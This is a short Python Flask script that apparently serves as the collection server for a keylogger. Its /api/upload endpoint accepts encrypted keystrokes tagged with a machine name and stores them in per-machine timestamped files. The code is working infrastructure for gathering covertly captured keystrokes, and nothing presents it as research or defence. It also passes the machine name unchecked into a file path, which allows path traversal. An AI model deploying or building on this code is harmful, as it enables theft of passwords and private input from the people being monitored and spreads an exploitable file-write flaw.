from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

DATA_DIR = "data"

def file_writer(machine, encrypted_data):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    machine_dir = os.path.join(DATA_DIR, machine)
    os.makedirs(machine_dir, exist_ok=True)

    filepath = os.path.join(machine_dir, f'{timestamp}.txt')
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(encrypted_data)

@app.route('/api/upload', methods=['POST'])
def upload():
    content = request.json
    machine = content.get("machine_name")
    encrypted_data = content.get("keystrokes")

    if not machine or not encrypted_data:
        return jsonify({"error": "Missing data"}), 400

    file_writer(machine, encrypted_data)
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(port=5000)

